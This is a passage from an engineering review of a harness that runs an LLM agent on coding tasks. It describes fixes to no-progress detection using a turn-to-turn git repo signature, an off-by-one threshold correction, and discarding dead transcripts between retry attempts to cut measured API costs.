   ANY edit lands and stays true forever after -- resetting the no-progress
   counter to 0 every single turn from then on, regardless of whether the
   model does anything at all. Consequence: an attempt that edits once at
   turn 3 then does nothing for 27 turns burns all 30; a later retry
   attempt that does nothing further after an earlier attempt left the
   tree dirty also burns all 30 -- reintroducing the exact cost-bleed shape
   round 1 was written to close, for the majority of the retry budget
   (every attempt after the first genuinely-partial edit). Round 1's own
   regression test didn't catch this because it only exercised a single
   attempt with a permanently-clean tree, never a carry-over-dirty case.
   Fixed: replaced the fixed-baseline check with `repo_state_signature()`
   (HEAD + `git status --porcelain` + a capped `git diff HEAD`, hashed),
   compared TURN-TO-TURN rather than to a frozen baseline -- a real further
   edit still resets the counter, but a tree that stops changing (dirty or
   not) keeps counting toward the cutoff. Verified by directly reproducing
   the bug scenario the skeptic described (signature constant, then one
   real change, then constant forever after): the old fixed-baseline logic
   would run all 30 turns; the new logic stops 5 turns (the test's
   threshold) after the last real change, confirmed by assertion.
2. Cosmetic-only: the threshold check used `>` instead of `>=` against
   `--max-turns-without-progress`, firing after N+1 no-progress turns
   instead of the documented N. Fixed as part of the same edit (now `>=`).

Nothing else new: `--resume-patch`'s `git am` failure paths, multi-commit
patches, fcntl locking across the whole file, and the resume message's
guidance were all re-checked and hold.

**Cost track** -- one real, quantified finding; three suspects checked and
dropped:
1. A no-progress attempt's fruitless transcript was still carried forward
   into the NEXT attempt untouched (only one feedback message appended,
   same as a real RED retry) -- so the second no-progress window re-paid
   for the first one's entire dead context on top of its own. Real numbers
   from `dense-tensor-type-build`'s persisted log: attempt-1's first 12
   turns (round 1's new default cutoff) cost $0.014439; attempt-2's
   equivalent 12-turn no-progress window cost $0.049085 -- 3.4x more for
   an IDENTICAL zero-progress outcome, purely from carried context (no
   cache-discount signature visible in the real per-call cost data).
   Fixed: on the `not moved` branch specifically (zero repo changes this
   attempt -- NOT the genuine-RED branch, whose full history has real,
   proven value and is untouched), `messages[2:]` is discarded before the
   next attempt, replaced with a short "you explored without editing, try
   differently" note instead of appending on top of the dead transcript.
   `messages[0]`/`[1]` (system/task) are never touched, same invariant
   `trim_messages()` already keeps. Verified two ways: a monkeypatched unit
   test reproducing the exact scenario, and a full `main()`-level
   integration test (two consecutive no-progress attempts, retry-cap=1) --
   confirms STUCK detection still fires correctly (tail-text comparison is
   unaffected, it never depended on `messages` content) while the message
   list stays flat (length 2 at the point STUCK is written) instead of
   accumulating attempt-1's whole tool-call transcript into attempt 2.
2. Per-turn `git_head()`/`git_dirty()` calls (round 1): confirmed
   negligible -- at most ~60 extra local subprocess spawns per attempt,
   each a few ms, against a 3400s wall-clock budget and multi-second LLM
   round-trips. Dropped.
3. `--resume-from`/`--resume-patch` cost risk: already fully covered by
   the v1-rejection analysis earlier in this doc (the exact "$0.35-0.70+ if
   resumed near the size cap" risk was already computed and answered by
   making it manual-only, single-row, with the runtime cache-staleness
   warning). No new finding; a suggestion to log OpenRouter's
   cache-related usage fields per turn (not currently captured) was noted
   as a nice-to-have for a future round to settle the cache-TTL question
   with real numbers instead of a hedge -- not acted on now, out of scope
   for this round.
4. retry-cap=2 interacting with the new early-exit: checked against the
   real STUCK run's numbers, no bug found -- the early exit reaches the
   same classification point the old full-30-turn attempt eventually did,
   so STUCK still fires after exactly 2 attempts. A theoretical risk
   remains for a task needing >12 read-only turns before its first edit;
   flagged as unverified (no real data shows it happening), not acted on.
